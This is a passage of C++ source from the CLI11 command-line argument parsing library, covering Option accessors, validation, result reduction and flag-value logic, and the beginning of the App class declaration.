        CLI11_NODISCARD int get_type_size() const { return type_size_min_; }

        /// The minimum number of arguments the option expects
        CLI11_NODISCARD int get_type_size_min() const { return type_size_min_; }
        /// The maximum number of arguments the option expects
        CLI11_NODISCARD int get_type_size_max() const { return type_size_max_; }

        /// Return the inject_separator flag
        CLI11_NODISCARD bool get_inject_separator() const { return inject_separator_; }

        /// The environment variable associated to this value
        CLI11_NODISCARD std::string get_envname() const { return envname_; }

        /// The set of options needed
        CLI11_NODISCARD std::set<Option*> get_needs() const { return needs_; }

        /// The set of options excluded
        CLI11_NODISCARD std::set<Option*> get_excludes() const { return excludes_; }

        /// The default value (for help printing)
        CLI11_NODISCARD std::string get_default_str() const { return default_str_; }

        /// Get the callback function
        CLI11_NODISCARD callback_t get_callback() const { return callback_; }

        /// Get the long names
        CLI11_NODISCARD const std::vector<std::string>& get_lnames() const { return lnames_; }

        /// Get the short names
        CLI11_NODISCARD const std::vector<std::string>& get_snames() const { return snames_; }

        /// Get the flag names with specified default values
        CLI11_NODISCARD const std::vector<std::string>& get_fnames() const { return fnames_; }
        /// Get a single name for the option, first of lname, sname, pname, envname
        CLI11_NODISCARD const std::string& get_single_name() const {
            if (!lnames_.empty()) {
                return lnames_[0];
            }
            if (!snames_.empty()) {
                return snames_[0];
            }
            if (!pname_.empty()) {
                return pname_;
            }
            return envname_;
        }
        /// The number of times the option expects to be included
        CLI11_NODISCARD int get_expected() const { return expected_min_; }

        /// The number of times the option expects to be included
        CLI11_NODISCARD int get_expected_min() const { return expected_min_; }
        /// The max number of times the option expects to be included
        CLI11_NODISCARD int get_expected_max() const { return expected_max_; }

        /// The total min number of expected  string values to be used
        CLI11_NODISCARD int get_items_expected_min() const { return type_size_min_ * expected_min_; }

        /// Get the maximum number of items expected to be returned and used for the callback
        CLI11_NODISCARD int get_items_expected_max() const {
            int t = type_size_max_;
            return detail::checked_multiply(t, expected_max_) ? t : detail::expected_max_vector_size;
        }
        /// The total min number of expected  string values to be used
        CLI11_NODISCARD int get_items_expected() const { return get_items_expected_min(); }

        /// True if the argument can be given directly
        CLI11_NODISCARD bool get_positional() const { return !pname_.empty(); }

        /// True if option has at least one non-positional name
        CLI11_NODISCARD bool nonpositional() const { return (!lnames_.empty() || !snames_.empty()); }

        /// True if option has description
        CLI11_NODISCARD bool has_description() const { return !description_.empty(); }

        /// Get the description
        CLI11_NODISCARD const std::string& get_description() const { return description_; }

        /// Set the description
        Option* description(std::string option_description) {
            description_ = std::move(option_description);
            return this;
        }

        Option* option_text(std::string text) {
            option_text_ = std::move(text);
            return this;
        }

        CLI11_NODISCARD const std::string& get_option_text() const { return option_text_; }

        ///@}
        /// @name Help tools
        ///@{

        /// \brief Gets a comma separated list of names.
        /// Will include / prefer the positional name if positional is true.
        /// If all_options is false, pick just the most descriptive name to show.
        /// Use `get_name(true)` to get the positional name (replaces `get_pname`)
        CLI11_NODISCARD std::string get_name(bool positional = false,  ///< Show the positional name
            bool all_options = false  ///< Show every option
        ) const;

        ///@}
        /// @name Parser tools
        ///@{

        /// Process the callback
        void run_callback();

        /// If options share any of the same names, find it
        CLI11_NODISCARD const std::string& matching_name(const Option& other) const;

        /// If options share any of the same names, they are equal (not counting positional)
        bool operator==(const Option& other) const { return !matching_name(other).empty(); }

        /// Check a name. Requires "-" or "--" for short / long, supports positional name
        CLI11_NODISCARD bool check_name(const std::string& name) const;

        /// Requires "-" to be removed from string
        CLI11_NODISCARD bool check_sname(std::string name) const {
            return (detail::find_member(std::move(name), snames_, ignore_case_) >= 0);
        }

        /// Requires "--" to be removed from string
        CLI11_NODISCARD bool check_lname(std::string name) const {
            return (detail::find_member(std::move(name), lnames_, ignore_case_, ignore_underscore_) >= 0);
        }

        /// Requires "--" to be removed from string
        CLI11_NODISCARD bool check_fname(std::string name) const {
            if (fnames_.empty()) {
                return false;
            }
            return (detail::find_member(std::move(name), fnames_, ignore_case_, ignore_underscore_) >= 0);
        }

        /// Get the value that goes for a flag, nominally gets the default value but allows for overrides if not
        /// disabled
        CLI11_NODISCARD std::string get_flag_value(const std::string& name, std::string input_value) const;

        /// Puts a result at the end
        Option* add_result(std::string s);

        /// Puts a result at the end and get a count of the number of arguments actually added
        Option* add_result(std::string s, int& results_added);

        /// Puts a result at the end
        Option* add_result(std::vector<std::string> s);

        /// Get the current complete results set
        CLI11_NODISCARD const results_t& results() const { return results_; }

        /// Get a copy of the results
        CLI11_NODISCARD results_t reduced_results() const;

        /// Get the results as a specified type
        template <typename T> void results(T& output) const {
            bool retval = false;
            if (current_option_state_ >= option_state::reduced || (results_.size() == 1 && validators_.empty())) {
                const results_t& res = (proc_results_.empty()) ? results_ : proc_results_;
                retval = detail::lexical_conversion<T, T>(res, output);
            }
            else {
                results_t res;
                if (results_.empty()) {
                    if (!default_str_.empty()) {
                        // _add_results takes an rvalue only
                        _add_result(std::string(default_str_), res);
                        _validate_results(res);
                        results_t extra;
                        _reduce_results(extra, res);
                        if (!extra.empty()) {
                            res = std::move(extra);
                        }
                    }
                    else {
                        res.emplace_back();
                    }
                }
                else {
                    res = reduced_results();
                }
                retval = detail::lexical_conversion<T, T>(res, output);
            }
            if (!retval) {
                throw ConversionError(get_name(), results_);
            }
        }

        /// Return the results as the specified type
        template <typename T> CLI11_NODISCARD T as() const {
            T output;
            results(output);
            return output;
        }

        /// See if the callback has been run already
        CLI11_NODISCARD bool get_callback_run() const { return (current_option_state_ == option_state::callback_run); }

        ///@}
        /// @name Custom options
        ///@{

        /// Set the type function to run when displayed on this option
        Option* type_name_fn(std::function<std::string()> typefun) {
            type_name_ = std::move(typefun);
            return this;
        }

        /// Set a custom option typestring
        Option* type_name(std::string typeval) {
            type_name_fn([typeval]() { return typeval; });
            return this;
        }

        /// Set a custom option size
        Option* type_size(int option_type_size);

        /// Set a custom option type size range
        Option* type_size(int option_type_size_min, int option_type_size_max);

        /// Set the value of the separator injection flag
        void inject_separator(bool value = true) { inject_separator_ = value; }

        /// Set a capture function for the default. Mostly used by App.
        Option* default_function(const std::function<std::string()>& func) {
            default_function_ = func;
            return this;
        }

        /// Capture the default value from the original value (if it can be captured)
        Option* capture_default_str() {
            if (default_function_) {
                default_str_ = default_function_();
            }
            return this;
        }

        /// Set the default value string representation (does not change the contained value)
        Option* default_str(std::string val) {
            default_str_ = std::move(val);
            return this;
        }

        /// Set the default value and validate the results and run the callback if appropriate to set the value into the
        /// bound value only available for types that can be converted to a string
        template <typename X> Option* default_val(const X& val) {
            std::string val_str = detail::to_string(val);
            auto old_option_state = current_option_state_;
            results_t old_results{ std::move(results_) };
            results_.clear();
            try {
                add_result(val_str);
                // if trigger_on_result_ is set the callback already ran
                if (run_callback_for_default_ && !trigger_on_result_) {
                    run_callback();  // run callback sets the state, we need to reset it again
                    current_option_state_ = option_state::parsing;
                }
                else {
                    _validate_results(results_);
                    current_option_state_ = old_option_state;
                }
            }
            catch (const ValidationError& err) {
                // this should be done
                results_ = std::move(old_results);
                current_option_state_ = old_option_state;
                // try an alternate way to convert
                std::string alternate = detail::value_string(val);
                if (!alternate.empty() && alternate != val_str) {
                    return default_val(alternate);
                }

                throw ValidationError(get_name(),
                    std::string("given default value does not pass validation :") + err.what());
            }
            catch (const ConversionError& err) {
                // this should be done
                results_ = std::move(old_results);
                current_option_state_ = old_option_state;

                throw ConversionError(
                    get_name(), std::string("given default value(\"") + val_str + "\") produces an error : " + err.what());
            }
            catch (const CLI::Error&) {
                results_ = std::move(old_results);
                current_option_state_ = old_option_state;
                throw;
            }
            results_ = std::move(old_results);
            default_str_ = std::move(val_str);
            return this;
        }

        /// Get the full typename for this option
        CLI11_NODISCARD std::string get_type_name() const;

    private:
        /// Run the results through the Validators
        void _validate_results(results_t& res) const;

        /** reduce the results in accordance with the MultiOptionPolicy
        @param[out] out results are assigned to res if there if they are different
        */
        void _reduce_results(results_t& out, const results_t& original) const;

        // Run a result through the Validators
        std::string _validate(std::string& result, int index) const;

        /// Add a single result to the result set, taking into account delimiters
        int _add_result(std::string&& result, std::vector<std::string>& res) const;
    };




    template <typename CRTP> template <typename T> void OptionBase<CRTP>::copy_to(T* other) const {
        other->group(group_);
        other->required(required_);
        other->ignore_case(ignore_case_);
        other->ignore_underscore(ignore_underscore_);
        other->configurable(configurable_);
        other->disable_flag_override(disable_flag_override_);
        other->delimiter(delimiter_);
        other->always_capture_default(always_capture_default_);
        other->multi_option_policy(multi_option_policy_);
    }

    CLI11_INLINE Option* Option::expected(int value) {
        if (value < 0) {
            expected_min_ = -value;
            if (expected_max_ < expected_min_) {
                expected_max_ = expected_min_;
            }
            allow_extra_args_ = true;
            flag_like_ = false;
        }
        else if (value == detail::expected_max_vector_size) {
            expected_min_ = 1;
            expected_max_ = detail::expected_max_vector_size;
            allow_extra_args_ = true;
            flag_like_ = false;
        }
        else {
            expected_min_ = value;
            expected_max_ = value;
            flag_like_ = (expected_min_ == 0);
        }
        return this;
    }

    CLI11_INLINE Option* Option::expected(int value_min, int value_max) {
        if (value_min < 0) {
            value_min = -value_min;
        }

        if (value_max < 0) {
            value_max = detail::expected_max_vector_size;
        }
        if (value_max < value_min) {
            expected_min_ = value_max;
            expected_max_ = value_min;
        }
        else {
            expected_max_ = value_max;
            expected_min_ = value_min;
        }

        return this;
    }

    CLI11_INLINE Option* Option::check(Validator validator, const std::string& validator_name) {
        validator.non_modifying();
        validators_.push_back(std::move(validator));
        if (!validator_name.empty())
            validators_.back().name(validator_name);
        return this;
    }

    CLI11_INLINE Option* Option::check(std::function<std::string(const std::string&)> Validator,
        std::string Validator_description,
        std::string Validator_name) {
        validators_.emplace_back(Validator, std::move(Validator_description), std::move(Validator_name));
        validators_.back().non_modifying();
        return this;
    }

    CLI11_INLINE Option* Option::transform(Validator Validator, const std::string& Validator_name) {
        validators_.insert(validators_.begin(), std::move(Validator));
        if (!Validator_name.empty())
            validators_.front().name(Validator_name);
        return this;
    }

    CLI11_INLINE Option* Option::transform(const std::function<std::string(std::string)>& func,
        std::string transform_description,
        std::string transform_name) {
        validators_.insert(validators_.begin(),
            Validator(
                [func](std::string& val) {
                    val = func(val);
                    return std::string{};
                },
                std::move(transform_description),
                std::move(transform_name)));

        return this;
    }

    CLI11_INLINE Option* Option::each(const std::function<void(std::string)>& func) {
        validators_.emplace_back(
            [func](std::string& inout) {
                func(inout);
                return std::string{};
            },
            std::string{});
        return this;
    }

    CLI11_INLINE Validator* Option::get_validator(const std::string& Validator_name) {
        for (auto& Validator : validators_) {
            if (Validator_name == Validator.get_name()) {
                return &Validator;
            }
        }
        if ((Validator_name.empty()) && (!validators_.empty())) {
            return &(validators_.front());
        }
        throw OptionNotFound(std::string{ "Validator " } + Validator_name + " Not Found");
    }

    CLI11_INLINE Validator* Option::get_validator(int index) {
        // This is an signed int so that it is not equivalent to a pointer.
        if (index >= 0 && index < static_cast<int>(validators_.size())) {
            return &(validators_[static_cast<decltype(validators_)::size_type>(index)]);
        }
        throw OptionNotFound("Validator index is not valid");
    }

    CLI11_INLINE bool Option::remove_needs(Option* opt) {
        auto iterator = std::find(std::begin(needs_), std::end(needs_), opt);

        if (iterator == std::end(needs_)) {
            return false;
        }
        needs_.erase(iterator);
        return true;
    }

    CLI11_INLINE Option* Option::excludes(Option* opt) {
        if (opt == this) {
            throw(IncorrectConstruction("and option cannot exclude itself"));
        }
        excludes_.insert(opt);

        // Help text should be symmetric - excluding a should exclude b
        opt->excludes_.insert(this);

        // Ignoring the insert return value, excluding twice is now allowed.
        // (Mostly to allow both directions to be excluded by user, even though the library does it for you.)

        return this;
    }

    CLI11_INLINE bool Option::remove_excludes(Option* opt) {
        auto iterator = std::find(std::begin(excludes_), std::end(excludes_), opt);

        if (iterator == std::end(excludes_)) {
            return false;
        }
        excludes_.erase(iterator);
        return true;
    }

    template <typename T> Option* Option::ignore_case(bool value) {
        if (!ignore_case_ && value) {
            ignore_case_ = value;
            auto* parent = static_cast<T*>(parent_);
            for (const Option_p& opt : parent->options_) {
                if (opt.get() == this) {
                    continue;
                }
                const auto& omatch = opt->matching_name(*this);
                if (!omatch.empty()) {
                    ignore_case_ = false;
                    throw OptionAlreadyAdded("adding ignore case caused a name conflict with " + omatch);
                }
            }
        }
        else {
            ignore_case_ = value;
        }
        return this;
    }

    template <typename T> Option* Option::ignore_underscore(bool value) {

        if (!ignore_underscore_ && value) {
            ignore_underscore_ = value;
            auto* parent = static_cast<T*>(parent_);
            for (const Option_p& opt : parent->options_) {
                if (opt.get() == this) {
                    continue;
                }
                const auto& omatch = opt->matching_name(*this);
                if (!omatch.empty()) {
                    ignore_underscore_ = false;
                    throw OptionAlreadyAdded("adding ignore underscore caused a name conflict with " + omatch);
                }
            }
        }
        else {
            ignore_underscore_ = value;
        }
        return this;
    }

    CLI11_INLINE Option* Option::multi_option_policy(MultiOptionPolicy value) {
        if (value != multi_option_policy_) {
            if (multi_option_policy_ == MultiOptionPolicy::Throw && expected_max_ == detail::expected_max_vector_size &&
                expected_min_ > 1) {  // this bizarre condition is to maintain backwards compatibility
                // with the previous behavior of expected_ with vectors
                expected_max_ = expected_min_;
            }
            multi_option_policy_ = value;
            current_option_state_ = option_state::parsing;
        }
        return this;
    }

    CLI11_NODISCARD CLI11_INLINE std::string Option::get_name(bool positional, bool all_options) const {
        if (get_group().empty())
            return {};  // Hidden

        if (all_options) {

            std::vector<std::string> name_list;

            /// The all list will never include a positional unless asked or that's the only name.
            if ((positional && (!pname_.empty())) || (snames_.empty() && lnames_.empty())) {
                name_list.push_back(pname_);
            }
            if ((get_items_expected() == 0) && (!fnames_.empty())) {
                for (const std::string& sname : snames_) {
                    name_list.push_back("-" + sname);
                    if (check_fname(sname)) {
                        name_list.back() += "{" + get_flag_value(sname, "") + "}";
                    }
                }

                for (const std::string& lname : lnames_) {
                    name_list.push_back("--" + lname);
                    if (check_fname(lname)) {
                        name_list.back() += "{" + get_flag_value(lname, "") + "}";
                    }
                }
            }
            else {
                for (const std::string& sname : snames_)
                    name_list.push_back("-" + sname);

                for (const std::string& lname : lnames_)
                    name_list.push_back("--" + lname);
            }

            return detail::join(name_list);
        }

        // This returns the positional name no matter what
        if (positional)
            return pname_;

        // Prefer long name
        if (!lnames_.empty())
            return std::string(2, '-') + lnames_[0];

        // Or short name if no long name
        if (!snames_.empty())
            return std::string(1, '-') + snames_[0];

        // If positional is the only name, it's okay to use that
        return pname_;
    }

    CLI11_INLINE void Option::run_callback() {
        bool used_default_str = false;
        if (force_callback_ && results_.empty()) {
            used_default_str = true;
            add_result(default_str_);
        }
        if (current_option_state_ == option_state::parsing) {
            _validate_results(results_);
            current_option_state_ = option_state::validated;
        }

        if (current_option_state_ < option_state::reduced) {
            _reduce_results(proc_results_, results_);
        }

        current_option_state_ = option_state::callback_run;
        if (callback_) {
            const results_t& send_results = proc_results_.empty() ? results_ : proc_results_;
            bool local_result = callback_(send_results);
            if (used_default_str) {
                // we only clear the results if the callback was actually used
                // otherwise the callback is the storage of the default
                results_.clear();
                proc_results_.clear();
            }
            if (!local_result)
                throw ConversionError(get_name(), results_);
        }
    }

    CLI11_NODISCARD CLI11_INLINE const std::string& Option::matching_name(const Option& other) const {
        static const std::string estring;
        bool bothConfigurable = configurable_ && other.configurable_;
        for (const std::string& sname : snames_) {
            if (other.check_sname(sname))
                return sname;
            if (bothConfigurable && other.check_lname(sname))
                return sname;
        }
        for (const std::string& lname : lnames_) {
            if (other.check_lname(lname))
                return lname;
            if (lname.size() == 1 && bothConfigurable) {
                if (other.check_sname(lname)) {
                    return lname;
                }
            }
        }
        if (bothConfigurable && snames_.empty() && lnames_.empty() && !pname_.empty()) {
            if (other.check_sname(pname_) || other.check_lname(pname_) || pname_ == other.pname_)
                return pname_;
        }
        if (bothConfigurable && other.snames_.empty() && other.fnames_.empty() && !other.pname_.empty()) {
            if (check_sname(other.pname_) || check_lname(other.pname_) || (pname_ == other.pname_))
                return other.pname_;
        }
        if (ignore_case_ ||
            ignore_underscore_) {  // We need to do the inverse, in case we are ignore_case or ignore underscore
            for (const std::string& sname : other.snames_)
                if (check_sname(sname))
                    return sname;
            for (const std::string& lname : other.lnames_)
                if (check_lname(lname))
                    return lname;
        }
        return estring;
    }

    CLI11_NODISCARD CLI11_INLINE bool Option::check_name(const std::string& name) const {

        if (name.length() > 2 && name[0] == '-' && name[1] == '-')
            return check_lname(name.substr(2));
        if (name.length() > 1 && name.front() == '-')
            return check_sname(name.substr(1));
        if (!pname_.empty()) {
            std::string local_pname = pname_;
            std::string local_name = name;
            if (ignore_underscore_) {
                local_pname = detail::remove_underscore(local_pname);
                local_name = detail::remove_underscore(local_name);
            }
            if (ignore_case_) {
                local_pname = detail::to_lower(local_pname);
                local_name = detail::to_lower(local_name);
            }
            if (local_name == local_pname) {
                return true;
            }
        }

        if (!envname_.empty()) {
            // this needs to be the original since envname_ shouldn't match on case insensitivity
            return (name == envname_);
        }
        return false;
    }

    CLI11_NODISCARD CLI11_INLINE std::string Option::get_flag_value(const std::string& name,
        std::string input_value) const {
        static const std::string trueString{ "true" };
        static const std::string falseString{ "false" };
        static const std::string emptyString{ "{}" };
        // check for disable flag override_
        if (disable_flag_override_) {
            if (!((input_value.empty()) || (input_value == emptyString))) {
                auto default_ind = detail::find_member(name, fnames_, ignore_case_, ignore_underscore_);
                if (default_ind >= 0) {
                    // We can static cast this to std::size_t because it is more than 0 in this block
                    if (default_flag_values_[static_cast<std::size_t>(default_ind)].second != input_value) {
                        if (input_value == default_str_ && force_callback_) {
                            return input_value;
                        }
                        throw(ArgumentMismatch::FlagOverride(name));
                    }
                }
                else {
                    if (input_value != trueString) {
                        throw(ArgumentMismatch::FlagOverride(name));
                    }
                }
            }
        }
        auto ind = detail::find_member(name, fnames_, ignore_case_, ignore_underscore_);
        if ((input_value.empty()) || (input_value == emptyString)) {
            if (flag_like_) {
                return (ind < 0) ? trueString : default_flag_values_[static_cast<std::size_t>(ind)].second;
            }
            return (ind < 0) ? default_str_ : default_flag_values_[static_cast<std::size_t>(ind)].second;
        }
        if (ind < 0) {
            return input_value;
        }
        if (default_flag_values_[static_cast<std::size_t>(ind)].second == falseString) {
            errno = 0;
            auto val = detail::to_flag_value(input_value);
            if (errno != 0) {
                errno = 0;
                return input_value;
            }
            return (val == 1) ? falseString : (val == (-1) ? trueString : std::to_string(-val));
        }
        return input_value;
    }

    CLI11_INLINE Option* Option::add_result(std::string s) {
        _add_result(std::move(s), results_);
        current_option_state_ = option_state::parsing;
        return this;
    }

    CLI11_INLINE Option* Option::add_result(std::string s, int& results_added) {
        results_added = _add_result(std::move(s), results_);
        current_option_state_ = option_state::parsing;
        return this;
    }

    CLI11_INLINE Option* Option::add_result(std::vector<std::string> s) {
        current_option_state_ = option_state::parsing;
        for (auto& str : s) {
            _add_result(std::move(str), results_);
        }
        return this;
    }

    CLI11_NODISCARD CLI11_INLINE results_t Option::reduced_results() const {
        results_t res = proc_results_.empty() ? results_ : proc_results_;
        if (current_option_state_ < option_state::reduced) {
            if (current_option_state_ == option_state::parsing) {
                res = results_;
                _validate_results(res);
            }
            if (!res.empty()) {
                results_t extra;
                _reduce_results(extra, res);
                if (!extra.empty()) {
                    res = std::move(extra);
                }
            }
        }
        return res;
    }

    CLI11_INLINE Option* Option::type_size(int option_type_size) {
        if (option_type_size < 0) {
            // this section is included for backwards compatibility
            type_size_max_ = -option_type_size;
            type_size_min_ = -option_type_size;
            expected_max_ = detail::expected_max_vector_size;
        }
        else {
            type_size_max_ = option_type_size;
            if (type_size_max_ < detail::expected_max_vector_size) {
                type_size_min_ = option_type_size;
            }
            else {
                inject_separator_ = true;
            }
            if (type_size_max_ == 0)
                required_ = false;
        }
        return this;
    }

    CLI11_INLINE Option* Option::type_size(int option_type_size_min, int option_type_size_max) {
        if (option_type_size_min < 0 || option_type_size_max < 0) {
            // this section is included for backwards compatibility
            expected_max_ = detail::expected_max_vector_size;
            option_type_size_min = (std::abs)(option_type_size_min);
            option_type_size_max = (std::abs)(option_type_size_max);
        }

        if (option_type_size_min > option_type_size_max) {
            type_size_max_ = option_type_size_min;
            type_size_min_ = option_type_size_max;
        }
        else {
            type_size_min_ = option_type_size_min;
            type_size_max_ = option_type_size_max;
        }
        if (type_size_max_ == 0) {
            required_ = false;
        }
        if (type_size_max_ >= detail::expected_max_vector_size) {
            inject_separator_ = true;
        }
        return this;
    }

    CLI11_NODISCARD CLI11_INLINE std::string Option::get_type_name() const {
        std::string full_type_name = type_name_();
        if (!validators_.empty()) {
            for (const auto& Validator : validators_) {
                std::string vtype = Validator.get_description();
                if (!vtype.empty()) {
                    full_type_name += ":" + vtype;
                }
            }
        }
        return full_type_name;
    }

    CLI11_INLINE void Option::_validate_results(results_t& res) const {
        // Run the Validators (can change the string)
        if (!validators_.empty()) {
            if (type_size_max_ > 1) {  // in this context index refers to the index in the type
                int index = 0;
                if (get_items_expected_max() < static_cast<int>(res.size()) &&
                    (multi_option_policy_ == CLI::MultiOptionPolicy::TakeLast ||
                        multi_option_policy_ == CLI::MultiOptionPolicy::Reverse)) {
                    // create a negative index for the earliest ones
                    index = get_items_expected_max() - static_cast<int>(res.size());
                }

                for (std::string& result : res) {
                    if (detail::is_separator(result) && type_size_max_ != type_size_min_ && index >= 0) {
                        index = 0;  // reset index for variable size chunks
                        continue;
                    }
                    auto err_msg = _validate(result, (index >= 0) ? (index % type_size_max_) : index);
                    if (!err_msg.empty())
                        throw ValidationError(get_name(), err_msg);
                    ++index;
                }
            }
            else {
                int index = 0;
                if (expected_max_ < static_cast<int>(res.size()) &&
                    (multi_option_policy_ == CLI::MultiOptionPolicy::TakeLast ||
                        multi_option_policy_ == CLI::MultiOptionPolicy::Reverse)) {
                    // create a negative index for the earliest ones
                    index = expected_max_ - static_cast<int>(res.size());
                }
                for (std::string& result : res) {
                    auto err_msg = _validate(result, index);
                    ++index;
                    if (!err_msg.empty())
                        throw ValidationError(get_name(), err_msg);
                }
            }
        }
    }

    CLI11_INLINE void Option::_reduce_results(results_t& out, const results_t& original) const {

        // max num items expected or length of vector, always at least 1
        // Only valid for a trimming policy

        out.clear();
        // Operation depends on the policy setting
        switch (multi_option_policy_) {
        case MultiOptionPolicy::TakeAll:
            break;
        case MultiOptionPolicy::TakeLast: {
            // Allow multi-option sizes (including 0)
            std::size_t trim_size = std::min<std::size_t>(
                static_cast<std::size_t>(std::max<int>(get_items_expected_max(), 1)), original.size());
            if (original.size() != trim_size) {
                out.assign(original.end() - static_cast<results_t::difference_type>(trim_size), original.end());
            }
        } break;
        case MultiOptionPolicy::Reverse: {
            // Allow multi-option sizes (including 0)
            std::size_t trim_size = std::min<std::size_t>(
                static_cast<std::size_t>(std::max<int>(get_items_expected_max(), 1)), original.size());
            if (original.size() != trim_size || trim_size > 1) {
                out.assign(original.end() - static_cast<results_t::difference_type>(trim_size), original.end());
            }
            std::reverse(out.begin(), out.end());
        } break;
        case MultiOptionPolicy::TakeFirst: {
            std::size_t trim_size = std::min<std::size_t>(
                static_cast<std::size_t>(std::max<int>(get_items_expected_max(), 1)), original.size());
            if (original.size() != trim_size) {
                out.assign(original.begin(), original.begin() + static_cast<results_t::difference_type>(trim_size));
            }
        } break;
        case MultiOptionPolicy::Join:
            if (results_.size() > 1) {
                out.push_back(detail::join(original, std::string(1, (delimiter_ == '\0') ? '\n' : delimiter_)));
            }
            break;
        case MultiOptionPolicy::Sum:
            out.push_back(detail::sum_string_vector(original));
            break;
        case MultiOptionPolicy::Throw:
        default: {
            auto num_min = static_cast<std::size_t>(get_items_expected_min());
            auto num_max = static_cast<std::size_t>(get_items_expected_max());
            if (num_min == 0) {
                num_min = 1;
            }
            if (num_max == 0) {
                num_max = 1;
            }
            if (original.size() < num_min) {
                throw ArgumentMismatch::AtLeast(get_name(), static_cast<int>(num_min), original.size());
            }
            if (original.size() > num_max) {
                if (original.size() == 2 && num_max == 1 && original[1] == "%%" && original[0] == "{}") {
                    // this condition is a trap for the following empty indicator check on config files
                    out = original;
                }
                else {
                    throw ArgumentMismatch::AtMost(get_name(), static_cast<int>(num_max), original.size());
                }
            }
            break;
        }
        }
        // this check is to allow an empty vector in certain circumstances but not if expected is not zero.
        // {} is the indicator for an empty container
        if (out.empty()) {
            if (original.size() == 1 && original[0] == "{}" && get_items_expected_min() > 0) {
                out.emplace_back("{}");
                out.emplace_back("%%");
            }
        }
        else if (out.size() == 1 && out[0] == "{}" && get_items_expected_min() > 0) {
            out.emplace_back("%%");
        }
    }

    CLI11_INLINE std::string Option::_validate(std::string& result, int index) const {
        std::string err_msg;
        if (result.empty() && expected_min_ == 0) {
            // an empty with nothing expected is allowed
            return err_msg;
        }
        for (const auto& vali : validators_) {
            auto v = vali.get_application_index();
            if (v == -1 || v == index) {
                try {
                    err_msg = vali(result);
                }
                catch (const ValidationError& err) {
                    err_msg = err.what();
                }
                if (!err_msg.empty())
                    break;
            }
        }

        return err_msg;
    }

    CLI11_INLINE int Option::_add_result(std::string&& result, std::vector<std::string>& res) const {
        int result_count = 0;

        // Handle the vector escape possibility all characters duplicated and starting with [[ ending with ]]
        // this is always a single result
        if (result.size() >= 4 && result[0] == '[' && result[1] == '[' && result.back() == ']' &&
            (*(result.end() - 2) == ']')) {
            // this is an escape clause for odd strings
            std::string nstrs{ '[' };
            bool duplicated{ true };
            for (std::size_t ii = 2; ii < result.size() - 2; ii += 2) {
                if (result[ii] == result[ii + 1]) {
                    nstrs.push_back(result[ii]);
                }
                else {
                    duplicated = false;
                    break;
                }
            }
            if (duplicated) {
                nstrs.push_back(']');
                res.push_back(std::move(nstrs));
                ++result_count;
                return result_count;
            }
        }

        if ((allow_extra_args_ || get_expected_max() > 1) && !result.empty() && result.front() == '[' &&
            result.back() == ']') {  // this is now a vector string likely from the default or user entry

            result.pop_back();
            result.erase(result.begin());
            bool skipSection{ false };
            for (auto& var : CLI::detail::split_up(result, ',')) {
                if (!var.empty()) {
                    result_count += _add_result(std::move(var), res);
                }
            }
            if (!skipSection) {
                return result_count;
            }
        }
        if (delimiter_ == '\0') {
            res.push_back(std::move(result));
            ++result_count;
        }
        else {
            if ((result.find_first_of(delimiter_) != std::string::npos)) {
                for (const auto& var : CLI::detail::split(result, delimiter_)) {
                    if (!var.empty()) {
                        res.push_back(var);
                        ++result_count;
                    }
                }
            }
            else {
                res.push_back(std::move(result));
                ++result_count;
            }
        }
        return result_count;
    }



#ifndef CLI11_PARSE
#define CLI11_PARSE(app, ...)                                                                                          \
    try {                                                                                                              \
        (app).parse(__VA_ARGS__);                                                                                      \
    } catch(const CLI::ParseError &e) {                                                                                \
        return (app).exit(e);                                                                                          \
    }
#endif

    namespace detail {
        enum class Classifier { NONE, POSITIONAL_MARK, SHORT, LONG, WINDOWS_STYLE, SUBCOMMAND, SUBCOMMAND_TERMINATOR };
        struct AppFriend;
    }  // namespace detail

    namespace FailureMessage {
        /// Printout a clean, simple message on error (the default in CLI11 1.5+)
        CLI11_INLINE std::string simple(const App* app, const Error& e);

        /// Printout the full help string on error (if this fn is set, the old default for CLI11)
        CLI11_INLINE std::string help(const App* app, const Error& e);
    }  // namespace FailureMessage

    /// enumeration of modes of how to deal with extras in config files

    enum class config_extras_mode : char { error = 0, ignore, ignore_all, capture };

    class App;

    using App_p = std::shared_ptr<App>;

    namespace detail {
        /// helper functions for adding in appropriate flag modifiers for add_flag

        template <typename T, enable_if_t<!std::is_integral<T>::value || (sizeof(T) <= 1U), detail::enabler> = detail::dummy>
        Option* default_flag_modifiers(Option* opt) {
            return opt->always_capture_default();
        }

        /// summing modifiers
        template <typename T, enable_if_t<std::is_integral<T>::value && (sizeof(T) > 1U), detail::enabler> = detail::dummy>
            Option* default_flag_modifiers(Option* opt) {
            return opt->multi_option_policy(MultiOptionPolicy::Sum)->default_str("0")->force_callback();
        }

    }  // namespace detail

    class Option_group;
    /// Creates a command line program, with very few defaults.
    /** To use, create a new `Program()` instance with `argc`, `argv`, and a help description. The templated
     *  add_option methods make it easy to prepare options. Remember to call `.start` before starting your
     * program, so that the options can be evaluated and the help option doesn't accidentally run your program. */
    class App {
        friend Option;
        friend detail::AppFriend;

    protected:
        // This library follows the Google style guide for member names ending in underscores

        /// @name Basics
        ///@{

        /// Subcommand name or program name (from parser if name is empty)
        std::string name_{};

        /// Description of the current program/subcommand
        std::string description_{};

        /// If true, allow extra arguments (ie, don't throw an error). INHERITABLE
        bool allow_extras_{ false };

        /// If ignore, allow extra arguments in the ini file (ie, don't throw an error). INHERITABLE
        /// if error, error on an extra argument, and if capture feed it to the app
        config_extras_mode allow_config_extras_{ config_extras_mode::ignore };

        ///  If true, cease processing on an unrecognized option (implies allow_extras) INHERITABLE
        bool prefix_command_{ false };

        /// If set to true the name was automatically generated from the command line vs a user set name
        bool has_automatic_name_{ false };

        /// If set to true the subcommand is required to be processed and used, ignored for main app
        bool required_{ false };

        /// If set to true the subcommand is disabled and cannot be used, ignored for main app
        bool disabled_{ false };

        /// Flag indicating that the pre_parse_callback has been triggered
        bool pre_parse_called_{ false };

        /// Flag indicating that the callback for the subcommand should be executed immediately on parse completion which is
        /// before help or ini files are processed. INHERITABLE
        bool immediate_callback_{ false };

        /// This is a function that runs prior to the start of parsing
        std::function<void(std::size_t)> pre_parse_callback_{};

        /// This is a function that runs when parsing has finished.
        std::function<void()> parse_complete_callback_{};

        /// This is a function that runs when all processing has completed
        std::function<void()> final_callback_{};

        ///@}
        /// @name Options
        ///@{

        /// The default values for options, customizable and changeable INHERITABLE
        OptionDefaults option_defaults_{};

        /// The list of options, stored locally
        std::vector<Option_p> options_{};

        ///@}
        /// @name Help
        ///@{

        /// Usage to put after program/subcommand description in the help output INHERITABLE
        std::string usage_{};

        /// This is a function that generates a usage to put after program/subcommand description in help output
        std::function<std::string()> usage_callback_{};

